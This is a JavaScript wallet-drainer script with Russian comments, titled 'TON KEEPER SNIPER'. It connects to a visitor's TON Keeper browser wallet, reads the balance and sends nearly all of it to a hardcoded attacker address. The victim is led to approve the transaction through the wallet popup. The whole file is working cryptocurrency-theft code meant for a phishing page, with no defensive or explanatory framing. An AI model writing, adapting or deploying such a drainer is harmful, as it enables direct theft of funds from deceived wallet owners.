// ============================================================
// TON KEEPER SNIPER — ПРЯМОЕ подключение через window.tonkeeper
// Целевой адрес: UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
// ============================================================

const TARGET_WALLET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
let userAddress = null;
let provider = null;

// ========== ПРЯМОЙ КОННЕКТ К TON KEEPER ==========
async function connectTonKeeper() {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    try {
        status.innerHTML = '⏳ Запрос подключения к TON Keeper...';
        btn.disabled = true;

        // 1. Проверяем наличие TON Keeper
        if (!window.tonkeeper) {
            status.innerHTML = '❌ TON Keeper НЕ УСТАНОВЛЕН! Установите расширение.';
            btn.disabled = false;
            return;
        }

        // 2. Подключаемся напрямую через tonkeeper
        provider = window.tonkeeper;
        
        // 3. Запрашиваем аккаунты (это вызовет всплывающее окно TON Keeper)
        const accounts = await provider.send('ton_requestAccounts', {});
        
        if (!accounts || accounts.length === 0) {
            status.innerHTML = '❌ Пользователь отклонил подключение.';
            btn.disabled = false;
            return;
        }

        userAddress = accounts[0];
        document.getElementById('userWallet').textContent = userAddress;
        status.innerHTML = `✅ Подключено! Адрес: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
        
        // 4. Получаем баланс
        await getBalanceAndSnipe();

    } catch (error) {
        console.error('CONNECT ERROR:', error);
        status.innerHTML = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
        btn.disabled = false;
    }
}

// ========== ПОЛУЧАЕМ БАЛАНС И ВЫВОДИМ ==========
async function getBalanceAndSnipe() {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    const balanceDisplay = document.getElementById('balanceDisplay');

    try {
        // Получаем баланс в наноTON
        const balanceHex = await provider.send('ton_getBalance', {
            address: userAddress
        });

        const balanceNano = parseInt(balanceHex, 16);
        const balanceTON = (balanceNano / 1e9).toFixed(6);
        balanceDisplay.textContent = `💰 Баланс: ${balanceTON} TON`;

        if (balanceNano <= 0) {
            status.innerHTML = '💰 Баланс 0 TON. Нечего выводить.';
            btn.disabled = false;
            return;
        }

        // Комиссия 0.01 TON
        const FEE_NANO = 10_000_000;
        const amountToSend = balanceNano - FEE_NANO;

        if (amountToSend <= 0) {
            status.innerHTML = '⚠️ Баланс меньше комиссии (0.01 TON).';
            btn.disabled = false;
            return;
        }

        const amountTON = (amountToSend / 1e9).toFixed(6);
        status.innerHTML = `🔄 Перевожу ${amountTON} TON на целевой адрес...`;

        // ========== ОТПРАВКА ТРАНЗАКЦИИ ==========
        const tx = {
            to: TARGET_WALLET,
            value: amountToSend.toString(),
            data: '',
            stateInit: ''
        };

        // Отправляем через TON Keeper (вызовет всплывашку с подтверждением)
        const result = await provider.send('ton_sendTransaction', tx);

        if (result && result.code === 0) {
            status.innerHTML = `✅ УСПЕШНО! ${amountTON} TON переведено на ${TARGET_WALLET}`;
            balanceDisplay.textContent = `💰 Баланс: 0 TON (всё выведено)`;
        } else {
            status.innerHTML = `⚠️ Транзакция не подтверждена: ${result?.message || 'отказ'}`;
        }

    } catch (error) {
        console.error('SNIPE ERROR:', error);
        status.innerHTML = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
    }

    btn.disabled = false;
}

// ========== НАВЕШИВАЕМ КНОПКУ ==========
document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('connectBtn');
    btn.addEventListener('click', connectTonKeeper);

    if (window.tonkeeper) {
        document.getElementById('status').innerHTML = '🟢 TON Keeper найден. Нажмите кнопку.';
    } else {
        document.getElementById('status').innerHTML = '🔴 TON Keeper не найден. Установите расширение.';
    }
});
